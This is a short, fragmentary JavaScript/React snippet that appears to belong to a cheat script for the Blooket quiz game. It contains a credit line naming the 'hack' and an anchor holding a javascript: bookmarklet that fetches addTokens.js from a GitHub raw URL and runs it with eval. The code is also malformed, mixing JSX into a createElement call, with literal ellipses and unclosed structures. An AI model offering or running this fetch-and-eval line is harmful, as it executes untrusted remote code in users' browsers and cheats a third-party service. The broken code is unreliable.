...
(async()=>{
  ...
  class App extends React.Component {
    ...
    render() {
      return e(
        'div',
        <p> THIS VERSION OF THIS HACK WAS MADE BY FORNITANDSPOON IT</p>
         <a> javascript: fetch("https://raw.githubusercontent.com/glixzzy/blooket-hack/main/global/addTokens.js").then((res) => res.text().then((t) => eval(t)))</a>
